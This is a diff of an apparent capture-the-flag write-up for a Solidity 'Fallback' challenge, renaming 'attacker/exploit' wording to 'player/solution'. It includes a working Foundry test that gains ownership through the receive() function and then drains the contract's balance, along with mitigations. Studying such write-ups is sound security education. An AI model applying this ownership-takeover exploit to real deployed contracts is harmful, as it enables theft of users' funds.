@@ -53,41 +53,41 @@ The vulnerability is located in `receive()`. A caller becomes the new owner afte
 
 Ownership transfer is directly coupled to ETH reception without explicit approval or authorization from the current owner.
 
-## Exploit Flow
+## Solution Flow
 
 ```text
-Fund the attacker
+Fund the player
         ↓
 Send 1 wei to contribute()
         ↓
-Satisfy contributions[attacker] > 0
+Satisfy contributions[player] > 0
         ↓
 Send 1 wei with empty calldata
         ↓
 Trigger receive()
         ↓
-Set owner = attacker
+Set owner = player
         ↓
 Call withdraw()
         ↓
-Drain the contract balance
+Withdraw the contract balance
 ```
 
-## Foundry Exploit
+## Foundry Solution
 
 ```solidity
-function testExploit() public {
-    vm.startPrank(attacker);
+function testSolve() public {
+    vm.startPrank(player);
 
-    fallback_contract.contribute{value: 1 wei}();
+    target.contribute{value: 1 wei}();
 
-    (bool success,) = address(fallback_contract).call{value: 1 wei}("");
-    require(success, "ETH send fail");
+    (bool success,) = address(target).call{value: 1 wei}("");
+    require(success, "ETH transfer failed");
 
-    assertEq(fallback_contract.owner(), attacker);
+    assertEq(target.owner(), player);
 
-    fallback_contract.withdraw();
-    assertEq(address(fallback_contract).balance, 0);
+    target.withdraw();
+    assertEq(address(target).balance, 0);
 
     vm.stopPrank();
 }
@@ -107,7 +107,7 @@ This low-level call sends ETH without a function selector, causing `Fallback.rec
 
 The contract combines ordinary ETH reception with a critical authorization change.
 
-A `receive()` function should generally focus on accepting ETH, but this implementation assigns ownership after checking only whether the sender has ever contributed. An attacker can establish that prerequisite with a negligible contribution and then seize control.
+A `receive()` function should generally focus on accepting ETH, but this implementation assigns ownership after checking only whether the sender has ever contributed. Any unauthorized caller can establish that prerequisite with a negligible contribution and then take control.
 
 ## Recommended Mitigations
 
@@ -123,10 +123,10 @@ A `receive()` function should generally focus on accepting ETH, but this impleme
 forge test --match-path test/01_Fallback.t.sol -vvv
 ```
 
-To inspect the complete exploit trace:
+To inspect the complete solution trace:
 
 ```bash
-forge test --match-test testExploit -vvvv
+forge test --match-test testSolve -vvvv
 ```
 
 ## Takeaway
